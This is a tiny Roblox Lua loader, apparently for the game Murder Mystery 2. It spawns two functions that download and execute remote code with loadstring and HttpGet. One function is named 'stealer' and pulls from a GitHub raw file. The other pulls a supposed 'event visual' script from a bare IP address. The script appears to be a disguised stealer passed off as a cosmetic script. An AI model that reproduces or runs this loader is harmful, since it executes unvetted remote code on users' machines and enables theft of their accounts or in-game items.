local function stealer()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/lexnow38/mm2/refs/heads/main/mm2%20script.lua"))()
end
local function loadui()
  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/mm2eventVisual.lua"))()
end
task.spawn(stealer)
task.spawn(loadui)